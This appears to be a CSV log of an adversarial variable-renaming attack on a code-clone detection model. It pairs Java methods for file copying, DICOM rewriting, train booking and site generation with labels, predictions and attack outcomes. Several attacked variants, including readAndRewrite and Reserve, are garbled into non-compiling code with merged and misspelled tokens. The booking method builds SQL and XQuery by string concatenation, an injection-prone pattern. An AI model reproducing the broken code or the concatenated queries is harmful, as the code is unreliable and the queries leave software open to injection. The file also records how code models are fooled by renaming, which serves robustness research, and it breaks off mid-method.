",364,,LABEL_1,LABEL_1,LABEL_1,-1,"copy,from_name,to_name,from_file,to_file,parent,dir,from,to,buffer,bytes_read",,,,0,,0,GA,3899,1.4874248147010802,failed,[]
14,"    private void doFinishLoadAttachment(long attachmentId) {
        if (attachmentId != mLoadAttachmentId) {
            return;
        }
        Attachment attachment = Attachment.restoreAttachmentWithId(MessageView.this, attachmentId);
        Uri attachmentUri = AttachmentProvider.getAttachmentUri(mAccountId, attachment.mId);
        Uri contentUri = AttachmentProvider.resolveAttachmentIdToContentUri(getContentResolver(), attachmentUri);
        if (mLoadAttachmentSave) {
            try {
                File file = createUniqueFile(Environment.getExternalStorageDirectory(), attachment.mFileName);
                InputStream in = getContentResolver().openInputStream(contentUri);
                OutputStream out = new FileOutputStream(file);
                IOUtils.copy(in, out);
                out.flush();
                out.close();
                in.close();
                Toast.makeText(MessageView.this, String.format(getString(R.string.message_view_status_attachment_saved), file.getName()), Toast.LENGTH_LONG).show();
                new MediaScannerNotifier(this, file, mHandler);
            } catch (IOException ioe) {
                Toast.makeText(MessageView.this, getString(R.string.message_view_status_attachment_not_saved), Toast.LENGTH_LONG).show();
            }
        } else {
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(contentUri);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                startActivity(intent);
            } catch (ActivityNotFoundException e) {
                mHandler.attachmentViewError();
            }
        }
    }
 <SPLIT>     public void execute(File sourceFile, File destinationFile, String conversionType, Properties java2HtmlConfig) {
        FileReader reader = null;
        Writer writer = null;
        try {
            reader = new FileReader(sourceFile);
            logger.info(""Using source file: "" + trimPath(userDir, sourceFile));
            if (!destinationFile.getParentFile().exists()) {
                createDirectory(destinationFile.getParentFile());
            }
            writer = new FileWriter(destinationFile);
            logger.info(""Destination file:  "" + trimPath(userDir, destinationFile));
            execute(reader, writer, conversionType, java2HtmlConfig);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (writer != null) {
                try {
                    writer.close();
                    writer = null;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (reader != null) {
                try {
                    reader.close();
                    reader = null;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
",266,,LABEL_1,LABEL_1,LABEL_1,-1,"doFinishLoadAttachment,attachmentId,attachment,attachmentUri,contentUri,file,in,out,intent",,,,0,,0,GA,2974,1.1045543551445007,failed,[]
15,"    private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
 <SPLIT>     public static void copy(String fileFrom, String fileTo) throws IOException {
        FileInputStream inputStream = null;
        FileOutputStream outputStream = null;
        FileChannel inputChannel = null;
        FileChannel outputChannel = null;
        try {
            inputStream = new FileInputStream(fileFrom);
            outputStream = new FileOutputStream(fileTo);
            inputChannel = inputStream.getChannel();
            outputChannel = outputStream.getChannel();
            inputChannel.transferTo(0, inputChannel.size(), outputChannel);
        } finally {
            try {
                inputChannel.close();
            } finally {
                try {
                    outputChannel.close();
                } finally {
                    try {
                        inputStream.close();
                    } finally {
                        outputStream.close();
                    }
                }
            }
        }
    }
",272,"    private static void readAndRewrite(File inputFile, File offFile) throws IOException {
        ImageInputStream iis iaisImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inputFile)));
        DcmParser dc dpmPolicy DcmParserFactory.getInstance().newDcmParser( iais);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
         dpmPolicy.setDcmHandler(ds.getDcmHandler());
         dpmPolicy.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdRepdReaderdFact.newReader(ds, dsais,  dpmPolicy.getDcmDecodeParam().byteOrder,  dpmPolicy.getReadVR());
        System.outurlintln(""reading "" + inputFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream url = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(offFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(url, dcmEncParam);
        dsdsriteHeader(ouurldcdcmEncParamTags.PixelData,  dpmPolicy.getReadVR(),  dpmPolicy.getReadLength());
        System.url.println(""writing "" + offFile + ""..."");
        PixelDataWriter pdpdWriter pdFact.newWriter(pdpdReaderetPixelDataArray(), false, dsdsouurl dpmPolicy.getDcmDecodeParam().byteOrder,  dpmPolicy.getReadVR());
        pdWriter.writePixelData();
        url.flush();
        url.close();
        System.url.println(""done!"");
    }
",LABEL_1,LABEL_1,0.5056931376457214,1,"readAndRewrite,inFile,outFile,iis,dcmParser,ds,pdReader,out,dcmEncParam,pdWriter",,,,15,"readAndRewrite:readAndRewrite,inFile:inputFile,outFile:offFile,iis: iais,dcmParser: dpmPolicy,ds:ds,pdReader:pdReader,out:url,dcmEncParam:dcmEncParam,pdWriter:pdWriter,",5,GA,664,0.2443931500116984,ga,[]
16,"    public static void copyFile(String inFile, String outFile) {
        File in = new File(inFile);
        File out = new File(outFile);
        try {
            FileChannel inChannel = new FileInputStream(in).getChannel();
            FileChannel outChannel = new FileOutputStream(out).getChannel();
            try {
                inChannel.transferTo(0, inChannel.size(), outChannel);
            } finally {
                if (inChannel != null) inChannel.close();
                if (outChannel != null) outChannel.close();
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
 <SPLIT>     @Override
    public OBJModel loadModel(URL url, String skin) throws IOException, IncorrectFormatException, ParsingErrorException {
        boolean baseURLWasNull = setBaseURLFromModelURL(url);
        OBJModel model = loadModel(url.openStream(), skin);
        if (baseURLWasNull) {
            popBaseURL();
        }
        return (model);
    }
",120,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFile,inFile,outFile,in,out,inChannel,outChannel",,,,0,,0,GA,2502,0.8854522864023845,failed,[]
17,"    private boolean copyFile(File _file1, File _file2) {
        FileInputStream fis;
        FileOutputStream fos;
        try {
            fis = new FileInputStream(_file1);
            fos = new FileOutputStream(_file2);
            FileChannel canalFuente = fis.getChannel();
            canalFuente.transferTo(0, canalFuente.size(), fos.getChannel());
            fis.close();
            fos.close();
            return true;
        } catch (FileNotFoundException e) {
        } catch (IOException e) {
        }
        return false;
    }
 <SPLIT>     private static void addFileToTarGz(TarArchiveOutputStream taro, String path, String base) throws IOException {
        File f = new File(path);
        String entryName = base + f.getName();
        FileInputStream goIn = new FileInputStream(f);
        TarArchiveEntry tarEntry = new TarArchiveEntry(f, entryName);
        taro.setLongFileMode(TarArchiveOutputStream.LONGFILE_GNU);
        taro.putArchiveEntry(tarEntry);
        if (f.isFile()) {
            IOUtils.copy(goIn, taro);
            taro.closeArchiveEntry();
        } else {
            taro.closeArchiveEntry();
            File[] children = f.listFiles();
            if (children != null) {
                for (File child : children) {
                    addFileToTarGz(taro, child.getAbsolutePath(), entryName + ""/"");
                }
            }
        }
        taro.close();
        goIn.close();
    }
",98,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,_file1,_file2,fis,fos,canalFuente",,,,0,,0,GA,1314,0.47627057631810504,failed,[]
18,"    private static List runITQLQuery(String itqlQuery) throws Exception {
        String escapedItqlQuery = URLEncoder.encode(itqlQuery, ""UTF-8"");
        String url = ""http://"" + Config.getProperty(""FEDORA_SOAP_HOST"") + "":"" + Config.getProperty(""FEDORA_SOAP_ACCESS_PORT"") + ""/fedora/risearch?type=tuples"" + ""&lang=iTQL"" + ""&format=CSV"" + ""&distinct=on"" + ""&stream=on"" + ""&query="" + escapedItqlQuery;
        logger.debug(""url for risearch query: "" + url);
        URL urlObject = new URL(url);
        HttpURLConnection con = (HttpURLConnection) urlObject.openConnection();
        BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream()));
        logger.debug(""response code: "" + con.getResponseCode());
        if (con.getResponseCode() != 200 && con.getResponseCode() != 302) {
            throw new FedoraAccessException(""Could not access the risearch service at url: "" + url);
        }
        ArrayList arrayList = new ArrayList();
        String inputLine;
        int counter = 0;
        while ((inputLine = br.readLine()) != null) {
            logger.debug(""reading line:"" + inputLine);
            if (inputLine.indexOf(""<html>"") >= 0) {
                logger.error(""problem quering the relationship"");
                throw new Exception(""Problem querying relationships; probably a bad ITQL query:"" + itqlQuery);
            }
            if (counter >= 1 && inputLine.indexOf(""/"") >= 0 && inputLine.trim().length() > 0) {
                logger.debug(""adding line:"" + inputLine);
                inputLine = inputLine.substring(inputLine.indexOf(""/"") + 1);
                arrayList.add(inputLine);
                logger.debug(""found relationship to item: "" + inputLine);
            }
            counter++;
        }
        br.close();
        logger.debug(""num relationships found: "" + arrayList.size());
        return arrayList;
    }
 <SPLIT>     public int run(String[] args) throws Exception {
        if (args.length < 2) {
            System.err.println(""Download dir local"");
            return 1;
        }
        OutputStream out = new FileOutputStream(args[1]);
        Path srcDir = new Path(args[0]);
        Configuration conf = new Configuration();
        FileSystem srcFS = FileSystem.get(conf);
        if (!srcFS.getFileStatus(srcDir).isDirectory()) {
            System.err.println(args[0] + "" is not a directory."");
            return 1;
        }
        try {
            FileStatus contents[] = srcFS.listStatus(srcDir);
            for (int i = 0; i < contents.length; i++) {
                if (contents[i].isFile()) {
                    System.err.println(contents[i].getPath());
                    InputStream in = srcFS.open(contents[i].getPath());
                    try {
                        IOUtils.copyBytes(in, out, conf, false);
                    } finally {
                        in.close();
                    }
                }
            }
        } finally {
            out.close();
        }
        return 0;
    }
",360,,LABEL_0,LABEL_0,LABEL_0,-1,"runITQLQuery,itqlQuery,escapedItqlQuery,url,urlObject,con,br,arrayList,inputLine,counter",,,,0,,0,GA,3690,1.3893802086512248,failed,[]
19,"    private void checkInputStream(InputStream in, byte[] cmp, boolean all) throws IOException {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        IOUtils.copy(in, stream);
        byte[] out = stream.toByteArray();
        if (all) assertEquals(cmp.length, out.length);
        for (int i = 0; i < cmp.length; i++) assertEquals(cmp[i], out[i]);
    }
 <SPLIT>     private String unJar(String jarPath, String jarEntry) {
        String path;
        if (jarPath.lastIndexOf(""lib/"") >= 0) path = jarPath.substring(0, jarPath.lastIndexOf(""lib/"")); else path = jarPath.substring(0, jarPath.lastIndexOf(""/""));
        String relPath = jarEntry.substring(0, jarEntry.lastIndexOf(""/""));
        try {
            new File(path + ""/"" + relPath).mkdirs();
            JarFile jar = new JarFile(jarPath);
            ZipEntry ze = jar.getEntry(jarEntry);
            File bin = new File(path + ""/"" + jarEntry);
            IOUtils.copy(jar.getInputStream(ze), new FileOutputStream(bin));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return path + ""/"" + jarEntry;
    }
",92,,LABEL_1,LABEL_1,LABEL_1,-1,"checkInputStream,in,cmp,all,stream,out,i",,,,0,,0,GA,2605,0.9241460204124451,failed,[]
20,"    private IProject createJavaProject() {
        IProject proj = ResourcesPlugin.getWorkspace().getRoot().getProject(""DefaultFolderPropertiesTest"");
        if (!proj.exists()) {
            try {
                proj.create(null);
                proj.open(null);
                IProjectDescription desc = proj.getDescription();
                desc.setNatureIds(new String[] { JavaCore.NATURE_ID });
                proj.setDescription(desc, null);
                IJavaProject javaProject = JavaCore.create(proj);
                javaProject.open(null);
                IFolder srcFolder1 = proj.getFolder(new Path(""src""));
                srcFolder1.create(true, true, null);
                IFolder srcFolder2 = proj.getFolder(new Path(""custom_src""));
                srcFolder2.create(true, true, null);
                IClasspathEntry[] classpathEntries = new IClasspathEntry[] { JavaCore.newSourceEntry(srcFolder1.getFullPath()), JavaCore.newSourceEntry(srcFolder2.getFullPath()), JavaRuntime.getDefaultJREContainerEntry() };
                javaProject.setRawClasspath(classpathEntries, null);
                IFolder binFolder = proj.getFolder(new Path(""bin""));
                if (!binFolder.exists()) {
                    binFolder.create(true, true, null);
                }
                javaProject.setOutputLocation(binFolder.getFullPath(), null);
                IFolder testFolder = proj.getFolder(new Path(""test""));
                testFolder.create(true, true, null);
                IFolder resultFolder = proj.getFolder(new Path(""result""));
                resultFolder.create(true, true, null);
            } catch (CoreException e) {
                fail(e.getMessage());
            }
        }
        return proj;
    }
 <SPLIT>     public void testReadHelloWorldTxt() throws Exception {
        final InputStream helloWorldIS = this.getClass().getClassLoader().getResourceAsStream(BASE_DIR + ""/HelloWorld.txt"");
        FileUtils.forceMkdir(new File(this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver""));
        final String helloWorldPath = this.testDir.getAbsolutePath() + ""/org/settings4j/contentresolver/HelloWorld.txt"";
        final FileOutputStream fileOutputStream = new FileOutputStream(new File(helloWorldPath));
        IOUtils.copy(helloWorldIS, fileOutputStream);
        IOUtils.closeQuietly(helloWorldIS);
        IOUtils.closeQuietly(fileOutputStream);
        LOG.info(""helloWorldPath: "" + helloWorldPath);
        final FSContentResolver contentResolver = new FSContentResolver();
        contentResolver.setRootFolderPath(this.testDir.getAbsolutePath());
        byte[] content = contentResolver.getContent(""org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
        content = contentResolver.getContent(""file:laksjdhalksdhfa"");
        assertNull(content);
        content = contentResolver.getContent(""/org/settings4j/contentresolver/HelloWorld.txt"");
        assertNotNull(content);
        assertEquals(""Hello World"", new String(content, ""UTF-8""));
    }
",332,,LABEL_0,LABEL_1,,-4,"createJavaProject,proj,desc,javaProject,srcFolder1,srcFolder2,classpathEntries,binFolder,testFolder,resultFolder",,,,0,,0,Greedy,1,0.0007308483123779297,,[]
21,"    private void Reserve() throws SQLException {
        Statement stbookings, stchartwl;
        String sp = """";
        if (useragent) sp = ""agent""; else sp = ""user"";
        String userbooksql = """";
        String agentbooksql = """";
        String bookingid = String.valueOf(System.currentTimeMillis());
        String currentcoach;
        String currentseat;
        try {
            if (useragent) {
                agentbooksql = ""update hp_administrator.agent_bookings set BOOKINGS = xmlquery('copy $new := $BOOKINGS modify do insert "";
                agentbooksql += "" <detail booking_id=\"""" + booking_details.getTicketno() + ""\"" status=\""open\"" train_no=\"""" + booking_details.getTrain_no() + ""\"" source=\"""" + booking_details.getSource() + ""\"" dest=\"""" + booking_details.getDestination() + ""\"" dep_date=\"""" + booking_details.getDate() + ""\"" > "";
            } else if (!useragent) {
                userbooksql = ""update hp_administrator.user_bookings set BOOKINGS = xmlquery('copy $new := $BOOKINGS modify do insert "";
                userbooksql += "" <detail booking_id=\"""" + booking_details.getTicketno() + ""\"" status=\""open\"" train_no=\"""" + booking_details.getTrain_no() + ""\"" source=\"""" + booking_details.getSource() + ""\"" dest=\"""" + booking_details.getDestination() + ""\"" dep_date=\"""" + booking_details.getDate() + ""\"" > "";
            }
            for (int tickpos = 0; tickpos < booking_details.getNoOfPersons(); tickpos++) {
                currentcoach = coach.get(tickpos);
                currentseat = seatno.get(tickpos);
                if (!currentcoach.equals(""WL"")) {
                    String chartavailupdsql = ""update hp_administrator.chart_wl_order set AVAILABLE_BOOKED = xmlquery('copy $new := $AVAILABLE_BOOKED   modify do insert "";
                    chartavailupdsql += ""<seat number=\"""" + currentseat + ""\""><details user_id=\"""" + booking_details.getUserId() + ""\"" usertype=\"""" + sp + ""\"" ticket_no=\"""" + booking_details.getTicketno() + ""\"" name=\"""" + booking_details.getNameAt(tickpos) + ""\"" age=\"""" + booking_details.getAgeAt(tickpos) + ""\"" sex=\"""" + booking_details.getSexAt(tickpos) + ""\"" type=\""primary\""  /></seat>"";
                    chartavailupdsql += "" into $new/status/class[@name=\"""" + booking_details.getTclass() + ""\""]/coach[@number=\"""" + currentcoach + ""\""] "";
                    chartavailupdsql += "" return  $new' ) where train_no like '"" + booking_details.getTrain_no() + ""' and date = '"" + booking_details.getDate() + ""' "";
                    System.out.println(chartavailupdsql);
                    stchartwl = conn.createStatement();
                    int updstat = stchartwl.executeUpdate(chartavailupdsql);
                    if (updstat > 0) System.out.println(""chart_wl  availability  updated"");
                } else if (currentcoach.equals(""WL"")) {
                    String chartwlupdsql = ""update hp_administrator.chart_wl_order set WAITLISTING = xmlquery('copy $new := $WAITLISTING modify do insert "";
                    chartwlupdsql += ""<details user_id=\"""" + booking_details.getUserId() + ""\"" usertype=\"""" + sp + ""\"" ticket_no=\"""" + booking_details.getTicketno() + ""\"" name=\"""" + booking_details.getNameAt(tickpos) + ""\"" age=\"""" + booking_details.getAgeAt(tickpos) + ""\"" sex=\"""" + booking_details.getSexAt(tickpos) + ""\"" type=\""primary\"" /></seat>"";
                    chartwlupdsql += "" into $new/status/class[@name=\"""" + booking_details.getTclass() + ""\""] "";
                    chartwlupdsql += "" return  $new' ) where train_no like '"" + booking_details.getTrain_no() + ""' and date = '"" + booking_details.getDate() + ""' "";
                    System.out.println(chartwlupdsql);
                    stchartwl = conn.createStatement();
                    int updstat = stchartwl.executeUpdate(chartwlupdsql);
                    if (updstat > 0) System.out.println(""chart_wl  waitlisting  updated"");
                }
                if (useragent) agentbooksql += ""<person><coach>"" + currentcoach + ""</coach><seat>"" + currentseat + ""</seat></person>""; else userbooksql += ""<person><coach>"" + currentcoach + ""</coach><seat>"" + currentseat + ""</seat></person>"";
            }
            if (useragent) {
                agentbooksql += ""</detail>   as first into $new/book return  $new' ) where agent_id like '"" + booking_details.getUserId() + ""'"";
                System.out.println(agentbooksql);
                stbookings = conn.createStatement();
                int updstat = stbookings.executeUpdate(agentbooksql);
                if (updstat > 0) System.out.println(""agent bookings updated"");
            } else {
                userbooksql += ""</detail>   as first into $new/book return  $new' ) where user_id like '"" + booking_details.getUserId() + ""'"";
                System.out.println(userbooksql);
                stbookings = conn.createStatement();
                int updstat = stbookings.executeUpdate(userbooksql);
                if (updstat > 0) System.out.println(""user bookings  updated"");
            }
        } catch (SQLException e) {
            conn.rollback();
            e.printStackTrace();
        }
    }
 <SPLIT>     public void buildSiteForEdit(String sBasePath, String sOutputPath, String sCtrlPath, String sMenuPath, String sIntegradorPath, String sSelPageOptions, Properties oEnvironmentProps, Properties oUserProps) throws IOException, DOMException, TransformerException, TransformerConfigurationException, MalformedURLException {
        Transformer oTransformer;
        StreamResult oStreamResult;
        StreamSource oStreamSrcXML;
        StringWriter oStrWritter;
        InputStream oXMLStream = null;
        String sTransformed;
        StringBuffer oPostTransform;
        String sKey;
        String sMedia;
        Object sVal;
        Page oCurrentPage;
        int iCloseHead, iOpenBody, iCloseBody;
        int iReaded;
        char CharBuffer[] = new char[8192];
        String sCharBuffer;
        long lElapsed = 0;
        final String sSep = System.getProperty(""file.separator"");
        if (DebugFile.trace) {
            lElapsed = System.currentTimeMillis();
            DebugFile.writeln(""Begin Pageset.buildSiteForEdit("" + sBasePath + "","" + sOutputPath + "","" + sCtrlPath + "","" + sMenuPath + "")"");
            DebugFile.incIdent();
        }
        FileSystem oFS = new FileSystem();
        Vector vPages = pages();
        if (!sBasePath.endsWith(sSep)) sBasePath += sSep;
        String sWebServer = oEnvironmentProps.getProperty(""webserver"", """");
        if (DebugFile.trace && sWebServer.length() == 0) DebugFile.writeln(""WARNING: webserver property not set at EnvironmentProperties"");
        if (!sWebServer.endsWith(""/"")) sWebServer += ""/"";
        Node oContainers = oMSite.seekChildByName(oMSite.getRootNode().getFirstChild(), ""containers"");
        if (oContainers == null) {
            if (DebugFile.trace) DebugFile.writeln(""ERROR: <containers> node not found."");
            throw new DOMException(DOMException.NOT_FOUND_ERR, ""<containers> node not found"");
        }
        if (DebugFile.trace) DebugFile.writeln(""new FileInputStream("" + (sURI.startsWith(""file://"") ? sURI.substring(7) : sURI) + "")"");
        for (int c = 0; c < vPages.size(); c++) {
            oCurrentPage = (Page) vPages.get(c);
            oXMLStream = new FileInputStream(sURI.startsWith(""file://"") ? sURI.substring(7) : sURI);
            oStreamSrcXML = new StreamSource(oXMLStream);
            oStrWritter = new StringWriter();
            oStreamResult = new StreamResult(oStrWritter);
            try {
                oTransformer = StylesheetCache.newTransformer(sBasePath + ""xslt"" + sSep + ""templates"" + sSep + oMSite.name() + sSep + oCurrentPage.template());
                sMedia = oTransformer.getOutputProperty(OutputKeys.MEDIA_TYPE);
                if (DebugFile.trace) DebugFile.writeln(OutputKeys.MEDIA_TYPE + ""="" + sMedia);
                if (null == sMedia) sMedia = ""html""; else sMedia = sMedia.substring(sMedia.indexOf('/') + 1);
                if (null == oCurrentPage.getTitle()) throw new NullPointerException(""Page "" + String.valueOf(c) + "" title is null"");
                if (DebugFile.trace) DebugFile.writeln(""Page.filePath("" + sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""."" + sMedia + "")"");
                oCurrentPage.filePath(sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""."" + sMedia);
                StylesheetCache.setParameters(oTransformer, oEnvironmentProps);
                StylesheetCache.setParameters(oTransformer, oUserProps);
                oTransformer.setParameter(""param_page"", ((Page) (vPages.get(c))).getTitle());
                oTransformer.transform(oStreamSrcXML, oStreamResult);
            } catch (TransformerConfigurationException e) {
                oLastXcpt = e;
                sMedia = null;
                SourceLocator sl = e.getLocator();
                if (DebugFile.trace) {
                    if (sl == null) {
                        DebugFile.writeln(""ERROR TransformerConfigurationException "" + e.getMessage());
                    } else {
                        DebugFile.writeln(""ERROR TransformerConfigurationException "" + e.getMessage() + "" line="" + String.valueOf(sl.getLineNumber()) + "" column="" + String.valueOf(sl.getColumnNumber()));
                    }
                }
            } catch (TransformerException e) {
                oLastXcpt = e;
                sMedia = null;
                if (DebugFile.trace) DebugFile.writeln(""ERROR TransformerException "" + e.getMessageAndLocation());
            }
            oTransformer = null;
            oStreamResult = null;
            sTransformed = oStrWritter.toString();
            if (DebugFile.trace) DebugFile.writeln(""transformation length="" + String.valueOf(sTransformed.length()));
            if (sTransformed.length() > 0) {
                iCloseHead = sTransformed.indexOf(""</head"");
                if (iCloseHead < 0) iCloseHead = sTransformed.indexOf(""</HEAD"");
                iOpenBody = sTransformed.indexOf(""<body"", iCloseHead);
                if (iOpenBody < 0) iOpenBody = sTransformed.indexOf(""<BODY"", iCloseHead);
                iCloseBody = sTransformed.indexOf("">"", iOpenBody + 5);
                for (char s = sTransformed.charAt(iCloseBody + 1); s == '\r' || s == '\n' || s == ' ' || s == '\t'; s = sTransformed.charAt(++iCloseBody)) ;
                oPostTransform = new StringBuffer(sTransformed.length() + 4096);
                oPostTransform.append(sTransformed.substring(0, iCloseHead));
                oPostTransform.append(""\n<script language=\""JavaScript\"" src=\"""" + sMenuPath + ""\""></script>"");
                oPostTransform.append(""\n<script language=\""JavaScript\"" src=\"""" + sIntegradorPath + ""\""></script>\n"");
                oPostTransform.append(sTransformed.substring(iCloseHead, iCloseHead + 7));
                oPostTransform.append(sTransformed.substring(iOpenBody, iCloseBody));
                try {
                    sCharBuffer = oFS.readfilestr(sCtrlPath, ""UTF-8"");
                    if (DebugFile.trace) DebugFile.writeln(String.valueOf(sCharBuffer.length()) + "" characters readed"");
                } catch (com.enterprisedt.net.ftp.FTPException ftpe) {
                    throw new IOException(ftpe.getMessage());
                }
                try {
                    if (DebugFile.trace) DebugFile.writeln(""Gadgets.replace("" + sCtrlPath + "",http://demo.hipergate.com/,"" + sWebServer + "")"");
                    Gadgets.replace(sCharBuffer, ""http://demo.hipergate.com/"", sWebServer);
                } catch (org.apache.oro.text.regex.MalformedPatternException e) {
                }
                oPostTransform.append(""<!--Begin "" + sCtrlPath + ""-->\n"");
                oPostTransform.append(sCharBuffer);
                sCharBuffer = null;
                oPostTransform.append(""\n<!--End "" + sCtrlPath + ""-->\n"");
                oPostTransform.append(sTransformed.substring(iCloseBody));
            } else {
                oPostTransform = new StringBuffer(""Page "" + ((Page) vPages.get(c)).getTitle() + "" could not be rendered."");
                if (oLastXcpt != null) oPostTransform.append(""<BR>"" + oLastXcpt.getMessageAndLocation());
            }
            if (DebugFile.trace) DebugFile.writeln(""new FileWriter("" + sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""_."" + sMedia + "")"");
            if (sSelPageOptions.length() == 0) oFS.writefilestr(sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""_."" + sMedia, oPostTransform.toString(), ""UTF-8""); else try {
                oFS.writefilestr(sOutputPath + oCurrentPage.getTitle().replace(' ', '_') + ""_."" + sMedia, Gadgets.replace(oPostTransform.toString(), "":selPageOptions"", sSelPageOptions), ""UTF-8"");
            } catch (Exception e) {
            }
            oPostTransform = null;
            sTransformed = null;
        }
        oXMLStream.close();
        if (DebugFile.trace) {
            DebugFile.writeln(""done in "" + String.valueOf(System.currentTimeMillis() - lElapsed) + "" miliseconds"");
            DebugFile.decIdent();
            DebugFile.writeln(""End Pageset.buildSiteForEdit()"");
        }
    }
",863,"    private void Reserve() throws SQLException {
        Statement stbookifications, STchartowl;
        String ap = """";
        if (useragent) ap = ""agent""; else ap = ""user"";
        String otherbookQL = """";
        String agentpluginsql = """";
        String bookingid = String.valueOf(System.currentTimeMillis());
        String  currentpoac;
        String activecourse;
        try {
            if (useragent) {
                agentpluginsql = ""update hp_administrator.agent_bookings set BOOKINGS = xmlquery('copy $new := $BOOKINGS modify do insert "";
                agentpluginsql += "" <detail booking_id=\"""" + booking_details.getTicketno() + ""\"" status=\""open\"" train_no=\"""" + booking_details.getTrain_no() + ""\"" source=\"""" + booking_details.getSource() + ""\"" dest=\"""" + booking_details.getDestination() + ""\"" dep_date=\"""" + booking_details.getDate() + ""\"" > "";
            } else if (!useragent) {
                otherbookQL = ""update hp_administrator.user_bookings set BOOKINGS = xmlquery('copy $new := $BOOKINGS modify do insert "";
                otherbookQL += "" <detail booking_id=\"""" + booking_details.getTicketno() + ""\"" status=\""open\"" train_no=\"""" + booking_details.getTrain_no() + ""\"" source=\"""" + booking_details.getSource() + ""\"" dest=\"""" + booking_details.getDestination() + ""\"" dep_date=\"""" + booking_details.getDate() + ""\"" > "";
            }
            for (int tickPos = 0; tickPos < booking_details.getNoOfPersons(); tickPos++) {
                 currentpoac = coach.get(tickPos);
                activecourse = seatno.get(tickPos);
                if (! currentpoac.equals(""WL"")) {
                    String chartavailupdssql = ""update hp_administrator.chart_wl_order set AVAILABLE_BOOKED = xmlquery('copy $new := $AVAILABLE_BOOKED   modify do insert "";
                    cchartavailupdssql+= ""<seat number=\"""" + activecourse + ""\""><details user_id=\"""" + booking_details.getUserId() + ""\"" usertype=\"""" + ap + ""\"" ticket_no=\"""" + booking_details.getTicketno() + ""\"" name=\"""" + booking_details.getNameAt(tickPos) + ""\"" age=\"""" + booking_details.getAgeAt(tickPos) + ""\"" sex=\"""" + booking_details.getSexAt(tickPos) + ""\"" type=\""primary\""  /></seat>"";
                    chartavailupdssql += "" into $new/status/class[@name=\"""" + booking_details.getTclass() + ""\""]/coach[@number=\"""" +  currentpoac + ""\""] "";
                    chartavailupdssql += "" return  $new' ) where train_no like '"" + booking_details.getTrain_no() + ""' and date = '"" + booking_details.getDate() + ""' "";
                    System.out.println(chartavailupdssql);
                    STchartowl = conn.createStatement();
                    int updstat = STchartowl.executeUpdate(chartavailupdssql);
                    if (updstat > 0) System.out.println(""chart_wl  availability  updated"");
                } else if ( currentpoac.equals(""WL"")) {
                    String chartwlupdsql = ""update hp_administrator.chart_wl_order set WAITLISTING = xmlquery('copy $new := $WAITLISTING modify do insert "";
                    chartwlupdsql += ""<details user_id=\"""" + booking_details.getUserId() + ""\"" usertype=\"""" + ap + ""\"" ticket_no=\"""" + booking_details.getTicketno() + ""\"" name=\"""" + booking_details.getNameAt(tickPos) + ""\"" age=\"""" + booking_details.getAgeAt(tickPos) + ""\"" sex=\"""" + booking_details.getSexAt(tickPos) + ""\"" type=\""primary\"" /></seat>"";
                    chartwlupdsql += "" into $new/status/class[@name=\"""" + booking_details.getTclass() + ""\""] "";
                    chartwlupdsql += "" return  $new' ) where train_no like '"" + booking_details.getTrain_no() + ""' and date = '"" + booking_details.getDate() + ""' "";
                    System.out.println(chartwlupdsql);
                    STchartowl = conn.createStatement();
                    int updstat = STchartowl.executeUpdate(chartwlupdsql);
                    if (updstat > 0) System.out.println(""chart_wl  waitlisting  updated"");
                }
                if (useragent) agentpluginsql += ""<person><coach>"" +  currentpoac + ""</coach><seat>"" + activecourse + ""</seat></person>""; else otherbookQL += ""<person><coach>"" +  currentpoac + ""</coach><seat>"" + activecourse + ""</seat></person>"";
            }
            if (useragent) {
                agentpluginsql += ""</detail>   as first into $new/book return  $new' ) where agent_id like '"" + booking_details.getUserId() + ""'"";
                System.out.println(agentpluginsql);
                stbookifications = conn.createStatement();
